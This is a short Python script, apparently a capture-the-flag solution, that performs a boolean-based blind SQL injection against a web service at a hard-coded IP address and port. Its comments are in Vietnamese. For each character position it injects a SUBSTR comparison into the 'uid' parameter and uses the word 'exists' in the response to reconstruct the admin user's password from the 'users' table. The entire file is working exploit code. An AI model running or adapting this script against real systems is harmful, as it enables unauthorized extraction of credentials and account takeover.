import requests

Charset = 'abcdefghijklmnopqrstuvwxyz0123456789_'
length = 20

pw = ''
for index in range (1,length+1):
    for c in Charset:
        Url = f"http://103.97.125.56:32766/?uid=admin'+AND+(SELECT+(SUBSTR((SELECT+upw+FROM+users+WHERE+uid+%3d+'admin'),{index},1)+%3d+'{c}')+%3d+1+)+--"

        response = requests.get(Url)
        
        print("dang test ki tu thu ",index," :",c,end="\r")
        
        if "exists" in response.text:
            pw += c
            print("ky tu ",index,"la",c,"----->","password{",pw,"}")
            break